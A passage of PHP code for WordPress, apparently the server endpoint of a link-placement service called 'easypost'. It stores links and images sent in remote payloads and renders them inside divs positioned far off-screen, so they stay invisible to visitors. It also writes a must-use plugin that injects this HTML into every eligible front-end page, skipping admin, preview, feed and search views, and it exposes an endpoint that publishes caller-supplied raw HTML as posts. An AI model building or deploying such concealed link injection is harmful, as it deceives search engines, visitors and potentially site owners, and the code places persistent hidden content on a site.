        $stored = easypost_endpoint_store_managed_placement($input, $post_id, $html);
        if (function_exists('update_post_meta')) {
            update_post_meta($post_id, '_easypost_homepage_placement_' . (int) $input['placementId'], array('method' => 'EASYPOST_MANAGED_RENDER', 'updatedAt' => gmdate('c')));
        }
        $warnings = array_merge($warnings, easypost_endpoint_cache_warnings($post_id));
        easypost_endpoint_json(200, array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => $post_id, 'pageUrl' => $stored['pageUrl'], 'changed' => $stored['changed'], 'alreadyPresent' => $stored['alreadyPresent'], 'warnings' => $warnings));
    } finally {
        easypost_endpoint_release_lock($post_id);
    }
}

function easypost_endpoint_remove_homepage_link($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_homepage_payload($payload);
    $post = easypost_endpoint_homepage_post();
    $post_id = (int) $post->ID;
    if (!easypost_endpoint_acquire_lock($post_id)) {
        easypost_endpoint_fallback_error('lock_busy');
    }
    try {
        $marker = easypost_endpoint_marker($input['placementId']);
        $changed = easypost_endpoint_remove_managed_placement($input['placementId']);
        $elementor_raw = function_exists('get_post_meta') ? (string) get_post_meta($post_id, '_elementor_data', true) : '';
        $elementor_mode = function_exists('get_post_meta') ? (string) get_post_meta($post_id, '_elementor_edit_mode', true) : '';
        if ($elementor_raw !== '' && $elementor_mode === 'builder' && strpos($elementor_raw, $marker) !== false) {
            $data = json_decode($elementor_raw, true);
            if (!is_array($data)) {
                easypost_endpoint_fallback_error('elementor_data_invalid');
            }
            $removed = false;
            $data = easypost_endpoint_remove_marker_from_elementor($data, $marker, $removed);
            if (!$removed || !function_exists('update_post_meta') || update_post_meta($post_id, '_elementor_data', wp_slash(json_encode($data))) === false) {
                easypost_endpoint_fallback_error('post_update_failed');
            }
            $changed = true;
        }
        $content = (string) $post->post_content;
        if (strpos($content, $marker) !== false) {
            $pattern = '/\\s*(?:<style>\\.dc\\{display:none;\\}<\\/style>\\s*)?<(?:p|div)[^>]*data-placement="' . preg_quote((string) $input['placementId'], '/') . '"[^>]*>.*?<\\/(?:p|div)>/s';
            $next = trim(preg_replace($pattern, '', $content, 1));
            $updated = wp_update_post(array('ID' => $post_id, 'post_content' => $next), true);
            if (is_wp_error($updated)) {
                easypost_endpoint_fallback_error('post_update_failed', $updated->get_error_message());
            }
            $changed = true;
        }
        $warnings = easypost_endpoint_cache_warnings($post_id);
        easypost_endpoint_json(200, array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => $post_id, 'pageUrl' => get_permalink($post_id), 'changed' => $changed, 'alreadyRemoved' => !$changed, 'warnings' => $warnings));
    } finally {
        easypost_endpoint_release_lock($post_id);
    }
}

function easypost_endpoint_nonfallback_error($error, $message = null, $warnings = array()) {
    easypost_endpoint_json(200, easypost_endpoint_nonfallback_payload($error, $message, $warnings));
}

function easypost_endpoint_nonfallback_payload($error, $message = null, $warnings = array()) {
    $response = array('ok' => false, 'error' => $error, 'fallback' => false);
    if ($message !== null) {
        $response['message'] = $message;
    }
    if (!empty($warnings)) {
        $response['warnings'] = $warnings;
    }
    return $response;
}

function easypost_endpoint_string_length($value) {
    if (!is_string($value)) {
        return false;
    }
    if (function_exists('mb_strlen')) {
        return mb_strlen($value, 'UTF-8');
    }
    $matched = preg_match_all('/./us', $value, $characters);
    return $matched === false ? false : $matched;
}

function easypost_endpoint_bounded_text($payload, $name, $maximum, $required) {
    if (!array_key_exists($name, $payload)) {
        if ($required) {
            easypost_endpoint_nonfallback_error('invalid_payload');
        }
        return '';
    }
    if (!is_string($payload[$name])) {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    $length = easypost_endpoint_string_length($payload[$name]);
    if ($length === false || $length > $maximum) {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    $value = sanitize_text_field($payload[$name]);
    if ($required && $value === '') {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    return $value;
}

function easypost_endpoint_http_url($payload, $name) {
    if (!array_key_exists($name, $payload) || !is_string($payload[$name])) {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    $value = trim($payload[$name]);
    $length = easypost_endpoint_string_length($value);
    $parts = $value === '' ? false : parse_url($value);
    if ($length === false || $length > 2048 || !is_array($parts)
        || empty($parts['scheme']) || empty($parts['host'])
        || !in_array(strtolower((string) $parts['scheme']), array('http', 'https'), true)
        || filter_var($value, FILTER_VALIDATE_URL) === false) {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    $sanitized = esc_url_raw($value, array('http', 'https'));
    if ($sanitized === '') {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    return $sanitized;
}

function easypost_endpoint_invisible_placement_id($payload) {
    $placement_id = isset($payload['placementId'])
        ? filter_var($payload['placementId'], FILTER_VALIDATE_INT, array('options' => array('min_range' => 1)))
        : false;
    $placement_type = isset($payload['placementType']) && is_string($payload['placementType'])
        ? strtoupper(sanitize_key($payload['placementType']))
        : '';
    if ($placement_id === false || $placement_type !== 'INVISIBLE_ZONE') {
        easypost_endpoint_nonfallback_error('invalid_payload');
    }
    return (int) $placement_id;
}

function easypost_endpoint_validate_homepage_image_payload($payload) {
    return array(
        'placementId' => easypost_endpoint_invisible_placement_id($payload),
        'targetUrl' => easypost_endpoint_http_url($payload, 'targetUrl'),
        'imageUrl' => easypost_endpoint_http_url($payload, 'imageUrl'),
        'altText' => easypost_endpoint_bounded_text($payload, 'altText', 500, true),
        'placementType' => 'INVISIBLE_ZONE',
    );
}

function easypost_endpoint_validate_sitewide_payload($payload) {
    return array(
        'placementId' => easypost_endpoint_invisible_placement_id($payload),
        'linkUrl' => easypost_endpoint_http_url($payload, 'linkUrl'),
        'anchorText' => easypost_endpoint_bounded_text($payload, 'anchorText', 500, true),
        'preLinkText' => easypost_endpoint_bounded_text($payload, 'preLinkText', 2000, false),
        'postLinkText' => easypost_endpoint_bounded_text($payload, 'postLinkText', 2000, false),
        'placementType' => 'INVISIBLE_ZONE',
    );
}

function easypost_endpoint_invisible_html($placement_id, $body) {
    return '<div data-placement="' . (int) $placement_id . '" style="left:-11407px;top:-10560px;position:absolute;">' . $body . '</div>';
}

function easypost_endpoint_homepage_image_html($input) {
    $body = '<a href="' . esc_url($input['targetUrl']) . '"><img src="' . esc_url($input['imageUrl']) . '" alt="' . esc_attr($input['altText']) . '"></a>';
    return easypost_endpoint_invisible_html($input['placementId'], $body);
}

function easypost_endpoint_sitewide_placement_html($input) {
    $prefix = $input['preLinkText'] === '' ? '' : esc_html($input['preLinkText']) . ' ';
    $suffix = $input['postLinkText'] === '' ? '' : $input['postLinkText'];
    if ($suffix !== '' && strpos($suffix, ' ') !== 0) {
        $suffix = ' ' . $suffix;
    }
    $body = $prefix . '<a href="' . esc_url($input['linkUrl']) . '">' . esc_html($input['anchorText']) . '</a>' . esc_html($suffix);
    return easypost_endpoint_invisible_html($input['placementId'], $body);
}

function easypost_endpoint_enforce_snippet_bound($html) {
    if (!is_string($html) || strlen($html) > 16384) {
        easypost_endpoint_nonfallback_error('snippet_too_large');
    }
}

function easypost_endpoint_try_store_homepage_image_placement($input, $post_id, $html) {
    if (!function_exists('get_option') || !function_exists('update_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    $placements = get_option(easypost_endpoint_managed_placements_option(), array());
    $placements = is_array($placements) ? $placements : array();
    $key = 'image:' . (int) $input['placementId'];
    $page_url = function_exists('get_permalink') ? get_permalink($post_id) : null;
    $next = array(
        'placementId' => (int) $input['placementId'],
        'placementKind' => 'HOMEPAGE_IMAGE',
        'pageId' => (int) $post_id,
        'pageUrl' => $page_url,
        'html' => $html,
        'updatedAt' => gmdate('c'),
    );
    $already_present = isset($placements[$key]) && is_array($placements[$key])
        && isset($placements[$key]['html']) && hash_equals((string) $placements[$key]['html'], $html);
    if ($already_present) {
        return array('ok' => true, 'changed' => false, 'alreadyPresent' => true, 'pageUrl' => $page_url);
    }
    $placements[$key] = $next;
    if (!update_option(easypost_endpoint_managed_placements_option(), $placements, false)) {
        return array('ok' => false, 'error' => 'runtime_option_update_failed');
    }
    return array('ok' => true, 'changed' => true, 'alreadyPresent' => false, 'pageUrl' => $page_url);
}

function easypost_endpoint_store_homepage_image_placement($input, $post_id, $html) {
    $result = easypost_endpoint_try_store_homepage_image_placement($input, $post_id, $html);
    if (!$result['ok']) {
        easypost_endpoint_fallback_error($result['error']);
    }
    unset($result['ok']);
    return $result;
}

function easypost_endpoint_try_remove_homepage_image_placement($placement_id) {
    if (!function_exists('get_option') || !function_exists('update_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    $placements = get_option(easypost_endpoint_managed_placements_option(), array());
    $placements = is_array($placements) ? $placements : array();
    $key = 'image:' . (int) $placement_id;
    if (!array_key_exists($key, $placements)) {
        return array('ok' => true, 'changed' => false);
    }
    unset($placements[$key]);
    if (!update_option(easypost_endpoint_managed_placements_option(), $placements, false)) {
        return array('ok' => false, 'error' => 'runtime_option_update_failed');
    }
    return array('ok' => true, 'changed' => true);
}

function easypost_endpoint_remove_homepage_image_placement($placement_id) {
    $result = easypost_endpoint_try_remove_homepage_image_placement($placement_id);
    if (!$result['ok']) {
        easypost_endpoint_fallback_error($result['error']);
    }
    return $result['changed'];
}

function easypost_endpoint_sitewide_option() {
    return 'easypost_sitewide_placements';
}

function easypost_endpoint_sitewide_lock_key() {
    return 'easypost_sitewide_write_lock';
}

function easypost_endpoint_acquire_sitewide_lock() {
    $key = easypost_endpoint_sitewide_lock_key();
    for ($attempt = 0; $attempt < 3; $attempt++) {
        $now = time();
        $owner = (string) ($now + 10);
        $insert = easypost_endpoint_insert_option_once($key, $owner);
        if ($insert === 'inserted') {
            return $owner;
        }
        if ($insert === 'unavailable') {
            easypost_endpoint_nonfallback_error('lock_store_unavailable');
        }
        $existing = easypost_endpoint_read_option_row($key);
        if ($existing['status'] === 'unavailable') {
            easypost_endpoint_nonfallback_error('lock_store_unavailable');
        }
        if ($existing['status'] === 'found' && (int) $existing['value'] <= $now) {
            if (easypost_endpoint_delete_expired_replay_record($key, $existing['value'], $now) === 'unavailable') {
                easypost_endpoint_nonfallback_error('lock_store_unavailable');
            }
        }
        if (function_exists('usleep')) {
            usleep(25000);
        }
    }
    easypost_endpoint_nonfallback_error('lock_busy');
}

function easypost_endpoint_release_sitewide_lock($owner) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'query') || !method_exists($wpdb, 'prepare')) {
        return false;
    }
    $deleted = $wpdb->query(
        $wpdb->prepare(
            "DELETE FROM {$wpdb->options} WHERE option_name = %s AND option_value = %s",
            easypost_endpoint_sitewide_lock_key(),
            (string) $owner
        )
    );
    if ($deleted === false) {
        return false;
    }
    if ((int) $deleted === 1) {
        easypost_endpoint_cache_option_deleted(easypost_endpoint_sitewide_lock_key());
    }
    return (int) $deleted === 1;
}

function easypost_endpoint_try_load_sitewide_placements() {
    if (!function_exists('get_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    try {
        $placements = get_option(easypost_endpoint_sitewide_option(), array());
    } catch (Throwable $ignored) {
        return array('ok' => false, 'error' => 'runtime_option_read_failed');
    }
    return array(
        'ok' => true,
        'placements' => is_array($placements) ? $placements : array(),
    );
}

function easypost_endpoint_load_sitewide_placements() {
    $result = easypost_endpoint_try_load_sitewide_placements();
    if (!$result['ok']) {
        easypost_endpoint_nonfallback_error($result['error']);
    }
    return $result['placements'];
}

function easypost_endpoint_try_save_sitewide_placements($placements) {
    if (!function_exists('update_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    try {
        $updated = update_option(easypost_endpoint_sitewide_option(), $placements, false);
    } catch (Throwable $ignored) {
        return array('ok' => false, 'error' => 'runtime_option_update_failed');
    }
    if (!$updated) {
        return array('ok' => false, 'error' => 'runtime_option_update_failed');
    }
    return array('ok' => true);
}

function easypost_endpoint_save_sitewide_placements($placements) {
    $result = easypost_endpoint_try_save_sitewide_placements($placements);
    if (!$result['ok']) {
        easypost_endpoint_nonfallback_error($result['error']);
    }
    return true;
}

function easypost_endpoint_try_store_sitewide_placement($input, $html) {
    if (!function_exists('get_option') || !function_exists('update_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    $loaded = easypost_endpoint_try_load_sitewide_placements();
    if (!$loaded['ok']) {
        return $loaded;
    }
    $placements = $loaded['placements'];
    $key = (string) (int) $input['placementId'];
    $next = array(
        'placementId' => (int) $input['placementId'],
        'placementKind' => 'SITEWIDE_TEXT',
        'html' => $html,
        'updatedAt' => gmdate('c'),
    );
    $already_present = isset($placements[$key]) && is_array($placements[$key])
        && isset($placements[$key]['html']) && hash_equals((string) $placements[$key]['html'], $html);
    if ($already_present) {
        return array('ok' => true, 'changed' => false, 'alreadyPresent' => true);
    }
    $placements[$key] = $next;
    $saved = easypost_endpoint_try_save_sitewide_placements($placements);
    if (!$saved['ok']) {
        return $saved;
    }
    return array('ok' => true, 'changed' => true, 'alreadyPresent' => false);
}

function easypost_endpoint_store_sitewide_placement($input, $html) {
    $result = easypost_endpoint_try_store_sitewide_placement($input, $html);
    if (!$result['ok']) {
        easypost_endpoint_nonfallback_error($result['error']);
    }
    unset($result['ok']);
    return $result;
}

function easypost_endpoint_try_remove_sitewide_placement($placement_id) {
    if (!function_exists('get_option') || !function_exists('update_option')) {
        return array('ok' => false, 'error' => 'capability_failed');
    }
    $loaded = easypost_endpoint_try_load_sitewide_placements();
    if (!$loaded['ok']) {
        return $loaded;
    }
    $placements = $loaded['placements'];
    $key = (string) (int) $placement_id;
    if (!array_key_exists($key, $placements)) {
        return array('ok' => true, 'changed' => false);
    }
    unset($placements[$key]);
    $saved = easypost_endpoint_try_save_sitewide_placements($placements);
    if (!$saved['ok']) {
        return $saved;
    }
    return array('ok' => true, 'changed' => true);
}

function easypost_endpoint_remove_sitewide_placement($placement_id) {
    $result = easypost_endpoint_try_remove_sitewide_placement($placement_id);
    if (!$result['ok']) {
        easypost_endpoint_nonfallback_error($result['error']);
    }
    return $result['changed'];
}

function easypost_endpoint_sitewide_runtime_path() {
    if (!defined('WP_CONTENT_DIR')) {
        return false;
    }
    $directory = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
    return $directory . '/easypost-sitewide-runtime.php';
}

function easypost_endpoint_sitewide_runtime_php() {
    $config = easypost_endpoint_config();
    $version = isset($config['endpoint_version']) ? (string) $config['endpoint_version'] : 'unknown';
    $runtime = <<<'PHP'
<?php
if (!defined('ABSPATH')) {
    exit;
}

if (!defined('EASYPOST_SITEWIDE_RUNTIME_VERSION')) {
    define('EASYPOST_SITEWIDE_RUNTIME_VERSION', '__EASYPOST_SITEWIDE_RUNTIME_VERSION__');
}

function easypost_sitewide_runtime_option() {
    return 'easypost_sitewide_placements';
}

function easypost_sitewide_runtime_is_eligible() {
    return $_SERVER['REQUEST_METHOD'] === 'GET'
        && !is_admin()
        && (!isset($GLOBALS['pagenow']) || $GLOBALS['pagenow'] !== 'wp-login.php')
        && !(defined('REST_REQUEST') && REST_REQUEST)
        && !(defined('XMLRPC_REQUEST') && XMLRPC_REQUEST)
        && !(function_exists('wp_doing_ajax') && wp_doing_ajax())
        && !(function_exists('wp_doing_cron') && wp_doing_cron())
        && !is_preview()
        && !is_feed()
        && !is_search()
        && !is_404()
        && !(function_exists('is_robots') && is_robots())
        && !(function_exists('is_favicon') && is_favicon())
        && !get_query_var('sitemap')
        && (is_front_page() || is_singular(array('post', 'page')) || is_archive());
}

function easypost_sitewide_runtime_content_type_is_html($headers) {
    foreach ($headers as $header) {
        if (stripos((string) $header, 'content-type:') !== 0) {
            continue;
        }
        $value = strtolower(trim(substr((string) $header, strlen('content-type:'))));
        return strpos($value, 'text/html') === 0 || strpos($value, 'application/xhtml+xml') === 0;
    }
    return true;
}

function easypost_sitewide_runtime_missing_html($buffer, $placements) {
    $html = array();
    foreach ($placements as $placement) {
        if (!is_array($placement) || empty($placement['html'])) {
            continue;
        }
        $placement_id = isset($placement['placementId']) ? (int) $placement['placementId'] : 0;
        if ($placement_id <= 0) {
            continue;
        }
        $marker = 'data-placement="' . $placement_id . '"';
        if (strpos($buffer, $marker) !== false) {
            continue;
        }
        $html[] = (string) $placement['html'];
    }
    return implode("\n", $html);
}

function easypost_sitewide_runtime_insert_before_body($buffer, $html) {
    $position = stripos($buffer, '</body>');
    if ($position === false) {
        return $buffer . "\n" . $html;
    }
    return substr($buffer, 0, $position) . "\n" . $html . "\n" . substr($buffer, $position);
}

function easypost_sitewide_runtime_inject_buffer($buffer) {
    if (!empty($GLOBALS['easypost_sitewide_runtime_injected'])) {
        return $buffer;
    }
    $status = http_response_code();
    if (($status !== false && ($status < 200 || $status >= 300))
        || !easypost_sitewide_runtime_content_type_is_html(headers_list())) {
        return $buffer;
    }
    $placements = isset($GLOBALS['easypost_sitewide_runtime_placements'])
        && is_array($GLOBALS['easypost_sitewide_runtime_placements'])
        ? $GLOBALS['easypost_sitewide_runtime_placements']
        : array();
    $html = easypost_sitewide_runtime_missing_html($buffer, $placements);
    if ($html === '') {
        return $buffer;
    }
    $GLOBALS['easypost_sitewide_runtime_injected'] = true;
    return easypost_sitewide_runtime_insert_before_body($buffer, $html);
}

function easypost_sitewide_runtime_buffer_start() {
    if (!easypost_sitewide_runtime_is_eligible() || !function_exists('get_option')) {
        return;
    }
    $placements = get_option(easypost_sitewide_runtime_option(), array());
    if (!is_array($placements) || empty($placements)) {
        return;
    }
    $GLOBALS['easypost_sitewide_runtime_placements'] = $placements;
    $GLOBALS['easypost_sitewide_runtime_injected'] = false;
    ob_start('easypost_sitewide_runtime_inject_buffer');
}

add_action('template_redirect', 'easypost_sitewide_runtime_buffer_start', 0);
PHP;
    return str_replace('__EASYPOST_SITEWIDE_RUNTIME_VERSION__', str_replace("'", "\\'", $version), $runtime);
}

function easypost_endpoint_install_sitewide_runtime(&$warnings) {
    if (!defined('WP_CONTENT_DIR') || !function_exists('wp_mkdir_p')) {
        $warnings[] = 'runtime_capability_unavailable';
        return false;
    }
    $path = easypost_endpoint_sitewide_runtime_path();
    if (!$path) {
        $warnings[] = 'runtime_path_unavailable';
        return false;
    }
    $directory = dirname($path);
    if (!is_dir($directory) && !wp_mkdir_p($directory)) {
        $warnings[] = 'runtime_directory_unavailable';
        return false;
    }
    $php = easypost_endpoint_sitewide_runtime_php();
    $current = is_readable($path) ? file_get_contents($path) : false;
    if ($current === $php) {
        return true;
    }
    $temporary = tempnam($directory, 'easypost-sitewide-');
    if (!is_string($temporary) || dirname($temporary) !== $directory) {
        if (is_string($temporary) && is_file($temporary)) {
            unlink($temporary);
        }
        $warnings[] = 'runtime_write_failed';
        return false;
    }
    $bytes = file_put_contents($temporary, $php, LOCK_EX);
    $written = is_readable($temporary) ? file_get_contents($temporary) : false;
    if ($bytes === false || $bytes !== strlen($php)
        || !is_string($written)
        || !hash_equals(hash('sha256', $php), hash('sha256', $written))) {
        unlink($temporary);
        $warnings[] = $bytes === false || $bytes !== strlen($php)
            ? 'runtime_write_failed'
            : 'runtime_integrity_failed';
        return false;
    }
    if (!rename($temporary, $path)) {
        unlink($temporary);
        $warnings[] = 'runtime_replace_failed';
        return false;
    }
    return true;
}

function easypost_endpoint_representative_page_url() {
    if (!function_exists('get_posts') || !function_exists('get_permalink')) {
        return null;
    }
    $front_page_id = function_exists('get_option') ? (int) get_option('page_on_front') : 0;
    $ids = get_posts(array(
        'post_type' => array('post', 'page'),
        'post_status' => 'publish',
        'posts_per_page' => 1,
        'fields' => 'ids',
        'no_found_rows' => true,
        'orderby' => 'ID',
        'order' => 'ASC',
        'post__not_in' => $front_page_id > 0 ? array($front_page_id) : array(),
    ));
    if (!is_array($ids) || empty($ids)) {
        return null;
    }
    $url = get_permalink((int) $ids[0]);
    return is_string($url) && $url !== '' ? $url : null;
}

function easypost_endpoint_sitewide_home_url() {
    return function_exists('home_url') ? home_url('/') : null;
}

function easypost_endpoint_place_homepage_image($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_homepage_image_payload($payload);
    $post = easypost_endpoint_homepage_post();
    $post_id = (int) $post->ID;
    $html = easypost_endpoint_homepage_image_html($input);
    easypost_endpoint_enforce_snippet_bound($html);
    if (!easypost_endpoint_acquire_lock($post_id)) {
        easypost_endpoint_fallback_error('lock_busy');
    }
    $warnings = array();
    $response = null;
    try {
        try {
            if (!easypost_endpoint_install_homepage_runtime($warnings)) {
                $response = easypost_endpoint_fallback_payload('runtime_install_failed', null, $warnings);
            } else {
                $stored = easypost_endpoint_try_store_homepage_image_placement($input, $post_id, $html);
                if (!$stored['ok']) {
                    $response = easypost_endpoint_fallback_payload($stored['error']);
                } else {
                    $warnings = array_merge($warnings, easypost_endpoint_cache_warnings($post_id));
                    $response = array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => $post_id, 'pageUrl' => $stored['pageUrl'], 'changed' => $stored['changed'], 'alreadyPresent' => $stored['alreadyPresent'], 'warnings' => $warnings);
                }
            }
        } finally {
            easypost_endpoint_release_lock($post_id);
        }
    } catch (Throwable $ignored) {
        $response = easypost_endpoint_fallback_payload('operation_failed');
    }
    easypost_endpoint_json(200, $response);
}

function easypost_endpoint_remove_homepage_image($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_homepage_image_payload($payload);
    $post = easypost_endpoint_homepage_post();
    $post_id = (int) $post->ID;
    if (!easypost_endpoint_acquire_lock($post_id)) {
        easypost_endpoint_fallback_error('lock_busy');
    }
    $response = null;
    try {
        try {
            $removed = easypost_endpoint_try_remove_homepage_image_placement($input['placementId']);
            if (!$removed['ok']) {
                $response = easypost_endpoint_fallback_payload($removed['error']);
            } else {
                $warnings = easypost_endpoint_cache_warnings($post_id);
                $page_url = function_exists('get_permalink') ? get_permalink($post_id) : null;
                $response = array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => $post_id, 'pageUrl' => $page_url, 'changed' => $removed['changed'], 'alreadyRemoved' => !$removed['changed'], 'warnings' => $warnings);
            }
        } finally {
            easypost_endpoint_release_lock($post_id);
        }
    } catch (Throwable $ignored) {
        $response = easypost_endpoint_fallback_payload('operation_failed');
    }
    easypost_endpoint_json(200, $response);
}

function easypost_endpoint_place_sitewide_link($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_sitewide_payload($payload);
    $html = easypost_endpoint_sitewide_placement_html($input);
    easypost_endpoint_enforce_snippet_bound($html);
    $warnings = array();
    if (!easypost_endpoint_install_sitewide_runtime($warnings)) {
        easypost_endpoint_nonfallback_error('runtime_install_failed', null, $warnings);
    }
    $owner = easypost_endpoint_acquire_sitewide_lock();
    $response = null;
    $released = false;
    try {
        try {
            $stored = easypost_endpoint_try_store_sitewide_placement($input, $html);
            if (!$stored['ok']) {
                $response = easypost_endpoint_nonfallback_payload($stored['error']);
            } else {
                $response = array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => null, 'pageUrl' => easypost_endpoint_sitewide_home_url(), 'representativePageUrl' => easypost_endpoint_representative_page_url(), 'changed' => $stored['changed'], 'alreadyPresent' => $stored['alreadyPresent'], 'fallback' => false, 'warnings' => $warnings);
            }
        } finally {
            $released = easypost_endpoint_release_sitewide_lock($owner);
        }
    } catch (Throwable $ignored) {
        $response = easypost_endpoint_nonfallback_payload('operation_failed');
    }
    if (!$released) {
        $response = easypost_endpoint_nonfallback_payload('lock_release_failed');
    }
    easypost_endpoint_json(200, $response);
}

function easypost_endpoint_remove_sitewide_link($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_sitewide_payload($payload);
    $owner = easypost_endpoint_acquire_sitewide_lock();
    $response = null;
    $released = false;
    try {
        try {
            $removed = easypost_endpoint_try_remove_sitewide_placement($input['placementId']);
            if (!$removed['ok']) {
                $response = easypost_endpoint_nonfallback_payload($removed['error']);
            } else {
                $response = array('ok' => true, 'method' => 'EASYPOST_MANAGED_RENDER', 'contentId' => null, 'pageUrl' => easypost_endpoint_sitewide_home_url(), 'representativePageUrl' => easypost_endpoint_representative_page_url(), 'changed' => $removed['changed'], 'alreadyRemoved' => !$removed['changed'], 'fallback' => false, 'warnings' => array());
            }
        } finally {
            $released = easypost_endpoint_release_sitewide_lock($owner);
        }
    } catch (Throwable $ignored) {
        $response = easypost_endpoint_nonfallback_payload('operation_failed');
    }
    if (!$released) {
        $response = easypost_endpoint_nonfallback_payload('lock_release_failed');
    }
    easypost_endpoint_json(200, $response);
}

function easypost_endpoint_create_post($payload) {
    easypost_endpoint_bootstrap_wordpress();
    if (!function_exists('wp_insert_post') || !function_exists('wp_slash')) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'capability_failed'));
    }

    $status = 'publish';
    $post_type = !empty($payload['post_type']) ? sanitize_key($payload['post_type']) : (!empty($payload['postType']) ? sanitize_key($payload['postType']) : 'post');
    $content = isset($payload['contentHtml']) ? $payload['contentHtml'] : (isset($payload['content']) ? $payload['content'] : '');
    $postarr = array(
        'post_title' => isset($payload['title']) ? wp_strip_all_tags($payload['title']) : '',
        'post_name' => isset($payload['slug']) ? sanitize_title($payload['slug']) : '',
        'post_content' => $content,
        'post_status' => $status,
        'post_type' => $post_type,
    );
    if (!empty($payload['date'])) {
        $postarr['post_date'] = $payload['date'];
    } elseif (!empty($payload['publicationDate'])) {
        $postarr['post_date'] = $payload['publicationDate'];
    }

    $post_id = wp_insert_post(wp_slash($postarr), true);
    if (is_wp_error($post_id)) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'insert_failed', 'message' => $post_id->get_error_message()));
    }

    easypost_endpoint_json(201, array(
        'ok' => true,
        'id' => (int) $post_id,
        'postId' => (int) $post_id,
        'link' => get_permalink($post_id),
        'postUrl' => get_permalink($post_id),
        'slug' => get_post_field('post_name', $post_id),
        'status' => get_post_status($post_id),
        'created' => true,
    ));
}

function easypost_endpoint_posting_type($payload) {
    foreach (array('post_type', 'postType') as $key) {
        if (array_key_exists($key, $payload)
            && (!is_string($payload[$key]) || !in_array($payload[$key], array('post', 'page'), true))) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_post_type'));
        }
    }
    if (isset($payload['post_type'], $payload['postType']) && $payload['post_type'] !== $payload['postType']) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_post_type'));
    }
    return isset($payload['post_type']) ? $payload['post_type'] : (isset($payload['postType']) ? $payload['postType'] : 'post');
}

function easypost_endpoint_posting_id($value) {
    if (!is_int($value) || $value < 1) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_post_id'));
    }
    return $value;
}

function easypost_endpoint_posting_row($post_type, $field, $value) {
    global $wpdb;
    if (!isset($wpdb->posts) || !method_exists($wpdb, 'prepare') || !method_exists($wpdb, 'query')
        || ($field === 'target' && !method_exists($wpdb, 'esc_like'))) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_unavailable'));
    }
    $condition = 'BINARY post_name = %s';
    if ($field === 'id') {
        $condition = 'ID = %d';
    } elseif ($field === 'target') {
        $condition = 'BINARY post_content LIKE BINARY %s';
        $value = '%' . $wpdb->esc_like($value) . '%';
    }
    $query = $wpdb->prepare(
        "SELECT ID, post_type, post_name, post_status, post_title, post_content FROM {$wpdb->posts} WHERE post_type = %s AND post_status IN ('publish', 'private', 'draft', 'pending', 'future') AND {$condition} ORDER BY ID ASC LIMIT 1",
        $post_type,
        $value
    );
    if (!$query) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_failed'));
    }
    $selected = $wpdb->query($query);
    if ($selected === false || !empty($wpdb->last_error) || !is_array($wpdb->last_result)
        || !is_int($selected) || $selected < 0 || $selected > 1 || count($wpdb->last_result) !== $selected) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_failed'));
    }
    if ($selected === 0) {
        return null;
    }
    $row = $wpdb->last_result[0];
    if (!is_object($row) || !isset($row->ID) || !ctype_digit((string) $row->ID) || (int) $row->ID < 1) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_invalid'));
    }
    foreach (array('post_type', 'post_name', 'post_status', 'post_title', 'post_content') as $key) {
        if (!isset($row->$key) || !is_string($row->$key)) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_invalid'));
        }
    }
    if ($row->post_type !== $post_type || !in_array($row->post_status, array('publish', 'private', 'draft', 'pending', 'future'), true)
        || ($field === 'id' && (int) $row->ID !== $value)) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'lookup_invalid'));
    }
    return $row;
}

function easypost_endpoint_lookup_post($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $post_type = easypost_endpoint_posting_type($payload);
    foreach (array('slug', 'targetUrl') as $key) {
        if (array_key_exists($key, $payload) && (!is_string($payload[$key]) || strlen($payload[$key]) > ($key === 'slug' ? 200 : 8192))) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_lookup'));
        }
    }
    $row = null;
    $conflict_by = '';
    if (array_key_exists('id', $payload)) {
        if (!empty($payload['slug']) || !empty($payload['targetUrl'])) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_lookup'));
        }
        $row = easypost_endpoint_posting_row($post_type, 'id', easypost_endpoint_posting_id($payload['id']));
        $conflict_by = 'ID';
    } else {
        $slug = isset($payload['slug']) ? trim($payload['slug']) : '';
        $target = isset($payload['targetUrl']) ? trim($payload['targetUrl']) : '';
        if ($slug === '' && $target === '') {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_lookup'));
        }
        if ($slug !== '') {
